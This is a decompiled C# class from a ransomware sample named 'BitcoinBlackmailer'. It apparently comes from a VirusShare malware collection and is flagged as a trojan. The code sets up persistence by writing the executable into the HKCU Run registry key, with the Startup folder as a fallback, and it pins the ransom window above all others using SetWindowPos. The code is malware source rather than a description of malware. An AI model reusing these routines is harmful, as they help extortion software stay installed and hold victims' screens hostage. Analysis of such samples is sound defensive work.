// Decompiled with JetBrains decompiler
// Type: Main.Tools.Windows
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 8BE9EE5B-D2E1-4CD7-973E-883BE52B7291
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-80a6681b00056a487bba1b66c046b798dfe18bf37aa30d8a4a1be968b9add997.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Main.Tools
{
  internal static class Windows
  {
    private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
    private const uint SWP_NOSIZE = 1;
    private const uint SWP_NOMOVE = 2;

    internal static void SetStartup(Main.Tools.Windows.StartupMethodType startupMethod)
    {
      if (startupMethod != Main.Tools.Windows.StartupMethodType.StartupFolder)
      {
        if (startupMethod != Main.Tools.Windows.StartupMethodType.Registry)
          return;
        try
        {
          Main.Tools.Windows.SetStartupRegistry(Config.FinalExePath);
        }
        catch
        {
          Main.Tools.Windows.SetStartupFolder();
        }
      }
      else
        Main.Tools.Windows.SetStartupFolder();
    }

    private static void SetStartupFolder()
    {
      if (Config.FinalExeRelativePath == null)
        return;
      Config.FinalExePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(Config.FinalExeRelativePath));
    }

    private static void SetStartupRegistry(string exePath) => Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true)?.SetValue(Path.GetFileName(exePath), (object) exePath);

    internal static void RemoveStartupRegistry(string exePath) => Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true)?.DeleteValue(Path.GetFileName(exePath), false);

    [DllImport("user32.dll")]
    private static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int X,
      int Y,
      int cx,
      int cy,
      uint uFlags);

    internal static void MakeTopMost(Form f) => Main.Tools.Windows.SetWindowPos(f.Handle, Main.Tools.Windows.HWND_TOPMOST, 0, 0, 0, 0, 3U);

    internal enum StartupMethodType
    {
      StartupFolder,
      Registry,
    }
  }
}
